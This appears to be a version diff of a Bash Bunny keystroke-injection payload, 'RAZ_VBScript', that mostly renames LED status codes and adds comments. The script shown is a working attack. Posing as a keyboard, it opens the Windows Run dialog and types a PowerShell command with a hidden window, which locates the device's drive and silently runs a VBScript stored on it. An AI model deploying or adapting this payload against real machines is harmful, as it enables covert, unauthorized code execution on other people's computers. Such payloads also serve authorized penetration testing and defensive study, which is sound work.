@@ -2,28 +2,37 @@
 #
 # Title:         RAZ_VBScript
 # Author:        RalphyZ
-# Version:       1.0
+# Version:       1.1
 # Target:        Windows 7+
 # Dependencies:  VBScript (a.vbs) in the switch folder with this file
 # 
 # Description:   Executes a VBScript, concealed in a hidden PowerShell window
 #
 # Colors:
-# Green.....................Working
-# White.....................Completed without error
-# Light-Blue (blinking).....a.vbs was not found
+# | Status     | Color                         | Description                                      |
+# | ---------- | ------------------------------| ------------------------------------------------ |
+# | SETUP      | Magenta solid                 | Setting attack mode, getting the switch position | 
+# | FAIL       | Red slow blink                | Could not find the a.vbs script                  | 
+# | ATTACK     | Yellow single blink           | Running the VBScript                             | 
+# | FINISH     | Green blink followed by SOLID | Script is finished                               | 
 
-LED G
+# Magenta solid
+LED SETUP
+
+# Set the attack mode
 ATTACKMODE HID STORAGE
 
 # Get the switch position
-source bunny_helpers.sh
+GET SWITCH_POSITION
 
 # Check if a.vbs is present
 if [ ! -f "/root/udisk/payloads/${SWITCH_POSITION}/a.vbs" ] ; then
-    LED B G 100
+    LED FAIL
     exit 1
 fi
+
+# Start the attack - yellow single blink
+LED ATTACK
 
 # Run the VBScript
 QUACK GUI r
@@ -31,5 +40,6 @@ QUACK DELAY 100
 QUACK STRING powershell -WindowStyle Hidden ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\${SWITCH_POSITION}\\a.vbs')"
 QUACK ENTER
 
-# Green LED for finished
-LED R G B
+# Green 1000ms VERYFAST blink followed by SOLID
+LED FINISH
+exit 0
